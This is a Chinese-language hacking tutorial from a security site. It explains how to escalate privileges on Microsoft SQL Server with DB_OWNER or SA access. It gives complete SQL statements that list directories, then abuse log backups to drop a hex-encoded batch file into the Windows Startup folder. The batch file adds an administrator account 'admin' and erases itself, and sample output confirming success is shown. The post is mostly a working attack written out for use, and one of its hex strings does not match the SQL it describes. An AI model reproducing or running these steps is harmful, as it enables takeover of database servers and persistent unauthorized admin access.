DB_OWNER OR SA备份BAT到启动项提权
www.hx99.net    时间: 2011-05-07    阅读: 次     整理: 华西安全网
下面只给出关键的代码：
使用查询分析器或者webshell连接上数据库后按如下步骤操作即可：
1.DB权限列目录
exec master..xp_dirtree 'c:\',1,1
使用以上语句可以实现db权限下列出磁盘目录

下面我们用备份的方式来备份一个BAT到启动项里

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
alter database [abc] set RECOVERY FULL--
create table cmd (a image)--
backup log [abc] to disk = 'c:\cmd1' with init--
insert into cmd (a) values (0x406563686F206F66660D0A406364202577696E646972250D0A406E657420757365722061646D696E2061646D696E202F6164640D0A406E6574206C6F63616C67726F75702061646D696E6973747261746F72732061646D696E202F6164640D0A4064656C2073746172742E6261740D0A40657869740D0A400D0A)--
backup log [abc] to disk = 'C:\Documents and Settings\All Users\「开始」菜单\程序\启动\start.bat'--
drop table cmd--
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

上面这几条SQL语句就是备份的语句.这里要注的是:
0x6E0065007400200075007300650072002000610064006D0069006E002000610064006D0069006E0020002F006100640064002000260020006E006500740020006C006F00630061006C00670072006F00750070002000610064006D0069006E006900730074007200610074006F00720073002000610064006D0069006E0020002F00610064006400200026002000640065006C002000730074006100720074002E00640061007400 这一句HEX加密的 是我们要打的命令 下面我告诉大家这个加密码的格式怎么用

编辑一个加用户ADMIN的命令 并删除START.BAT

@echo off
@cd %windir% /*这里也可以CD到SYSTEM32目录*/
@net user admin admin /add
@net localgroup administrators admin /add
@del start.bat /*这一步删除了BAT文件*/
@exit           /*这一步退出CMD*/
@               /*最后这个@最好加上.要不会把你的上一句命令弄出错*/


列数据库的命令：SELECT DB_NAME()

我这现在连接的库是abc

那么我们要把备份语句中的库名换成当前库的名abc

执行上面SQL语句后返回如下信息：

已处理 1 页，这些页属于数据库 abc的文件 abc_Log'（位于文件 1 上）。
BACKUP LOG 操作成功地处理了 1 页，花费了 0.048 秒（0.160 MB/秒）。

(1 row(s) affected)

已处理 1 页，这些页属于数据库 abc的文件 abc_Log'（位于文件 1 上）。
BACKUP LOG 操作成功地处理了 1 页，花费了 0.043 秒（0.083 MB/秒）。

说明我们备份成功了，到启动项里看看是不是多了一个bat文件，现在只等服务器重启并登陆后就会添加一个我们预先定义好的管理员账户了。

